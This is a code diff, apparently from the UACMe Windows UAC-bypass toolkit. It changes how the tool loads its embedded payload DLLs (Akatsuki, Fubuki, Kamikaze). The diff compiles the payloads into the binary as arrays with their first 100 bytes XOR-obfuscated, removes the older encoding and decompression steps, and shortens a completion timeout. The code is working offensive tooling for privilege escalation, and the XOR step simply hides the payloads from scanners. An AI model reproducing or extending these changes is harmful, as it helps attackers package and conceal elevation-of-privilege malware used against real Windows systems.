@@ -16,6 +16,7 @@
 *******************************************************************************/
 #include "global.h"
 #include "uas.h"
+#include "encresource.h"
 
 //
 // Signatures array.
@@ -923,38 +924,61 @@ BOOLEAN supSetCheckSumForMappedFile(
 */
 NTSTATUS supLdrQueryResourceDataEx(
     _In_ ULONG_PTR ResourceId,
-    _In_ PVOID DllHandle,
     _Out_ PULONG DataSize,
     _Out_ PVOID* Data
 )
 {
-    NTSTATUS                   status;
-    ULONG_PTR                  IdPath[3];
-    IMAGE_RESOURCE_DATA_ENTRY* DataEntry;
-    ULONG                      SizeOfData = 0;
+    //
+    // Query resource.
+    //
 
-    if (DataSize)
-        *DataSize = 0;
+    LPCVOID ResourceData = NULL;
+    ULONG ResourceSize = 0;
 
-    if (DllHandle == NULL) {
-        return STATUS_INVALID_PARAMETER_2;
+    switch (ResourceId)
+    {
+#ifdef _WIN64
+    case IDR_AKATSUKI64:
+        ResourceData = g_resourceAkatsuki64;
+        ResourceSize = sizeof(g_resourceAkatsuki64);
+        break;
+#endif
+    case IDR_FUBUKI32:
+        ResourceData = g_resourceFubuki32;
+        ResourceSize = sizeof(g_resourceFubuki32);
+        break;
+#ifdef _WIN64
+    case IDR_FUBUKI64:
+        ResourceData = g_resourceFubuki64;
+        ResourceSize = sizeof(g_resourceFubuki64);
+        break;
+#endif
+    case IDR_KAMIKAZE:
+        ResourceData = g_resourceKamikaze;
+        ResourceSize = sizeof(g_resourceKamikaze);
+        break;
     }
 
-    IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
-    IdPath[1] = ResourceId;           //id
-    IdPath[2] = 0;                    //lang
+    if (!ResourceData || !ResourceSize)
+        return STATUS_NOT_FOUND;
 
-    status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
-    if (NT_SUCCESS(status)) {
-        status = LdrAccessResource(DllHandle, DataEntry, Data, &SizeOfData);
-        if (NT_SUCCESS(status)) {
-            if (DataSize) {
-                *DataSize = SizeOfData;
-            }
-        }
-    }
+    //
+    // Allocate memory and copy resource.
+    //
 
-    return status;
+    SIZE_T SizeTemp = ResourceSize;
+    PVOID DataTemp = supVirtualAlloc(&SizeTemp, DEFAULT_ALLOCATION_TYPE, DEFAULT_PROTECT_TYPE, NULL);
+    if (!DataTemp)
+        return STATUS_NO_MEMORY;
+
+    supCopyMemory(DataTemp, SizeTemp, ResourceData, ResourceSize);
+    for (ULONG i = 0; i < min(100, ResourceSize); i++)
+        ((PBYTE)DataTemp)[i] ^= 0xAB;
+
+    *DataSize = ResourceSize;
+    *Data = DataTemp;
+
+    return STATUS_SUCCESS;
 }
 
 /*
@@ -967,7 +991,6 @@ NTSTATUS supLdrQueryResourceDataEx(
 */
 PBYTE supLdrQueryResourceData(
     _In_ ULONG_PTR ResourceId,
-    _In_ PVOID DllHandle,
     _Out_ PULONG DataSize
 )
 {
@@ -975,7 +998,6 @@ PBYTE supLdrQueryResourceData(
     PBYTE Data = NULL;
 
     status = supLdrQueryResourceDataEx(ResourceId,
-        DllHandle,
         DataSize,
         &Data);
 
@@ -2471,17 +2493,13 @@ VOID supDestroySharedParametersBlock(
 PVOID supCreateUacmeContext(
     _In_ ULONG Method,
     _In_reads_or_z_opt_(OptionalParameterLength) LPWSTR OptionalParameter,
-    _In_ ULONG OptionalParameterLength,
-    _In_ PVOID DecompressRoutine
+    _In_ ULONG OptionalParameterLength
 )
 {
     BOOLEAN IsWow64;
     ULONG Seed, NtBuildNumber = 0;
     PUACMECONTEXT Context;
     HANDLE ContextHeap = NtCurrentPeb()->ProcessHeap;
-#ifdef _UCM_CONSOLE
-    HMODULE hNtdll;
-#endif
     RTL_OSVERSIONINFOW osv;
 
     UNREFERENCED_PARAMETER(Method);
@@ -2585,17 +2603,6 @@ PVOID supCreateUacmeContext(
     _strcpy(Context->szDefaultPayload, Context->szSystemDirectory);
     _strcat(Context->szDefaultPayload, CMD_EXE);
 
-    Context->DecompressRoutine = (pfnDecompressPayload)supDecodePointer(DecompressRoutine);
-
-#ifdef _UCM_CONSOLE
-    hNtdll = GetModuleHandle(L"ntdll.dll");
-    if (hNtdll) {
-        Context->swprintf_s = (pswprintf_s)GetProcAddress(hNtdll, "swprintf_s");
-    }
-#else
-    Context->swprintf_s = (PVOID)-1;
-#endif
-
     return (PVOID)Context;
 }
 
@@ -2637,11 +2644,11 @@ BOOL supDecodeAndWriteBufferToFile(
     PVOID p;
     SIZE_T Size = ALIGN_UP_BY(BufferSize, PAGE_SIZE);
 
+    UNREFERENCED_PARAMETER(Key);
+
     p = supVirtualAlloc(&Size, DEFAULT_ALLOCATION_TYPE | MEM_TOP_DOWN, DEFAULT_PROTECT_TYPE, NULL);
     if (p) {
         RtlCopyMemory(p, Buffer, BufferSize);
-
-        EncodeBuffer(p, BufferSize, Key);
 
         bResult = supWriteBufferToFile(lpFileName, p, BufferSize);
 
@@ -2846,7 +2853,7 @@ NTSTATUS supWaitForGlobalCompletionEvent(
 #ifdef _DEBUG
         liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(10000, 10000);
 #else
-        liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(50000, 10000);
+        liDueTime.QuadPart = -(LONGLONG)UInt32x32To64(15000, 10000);
 #endif
         return NtWaitForSingleObject(g_ctx->SharedContext.hCompletionEvent, FALSE, &liDueTime);
     }
@@ -4625,7 +4632,6 @@ BOOLEAN supReplaceVersionInfo(
         }
 
         RtlCopyMemory(pvBuffer, lpResource, dwResourceSize);
-        EncodeBuffer(pvBuffer, dwResourceSize, dwKey);
 
         hUpdate = BeginUpdateResource(lpFileName, FALSE);
         if (hUpdate == NULL) {
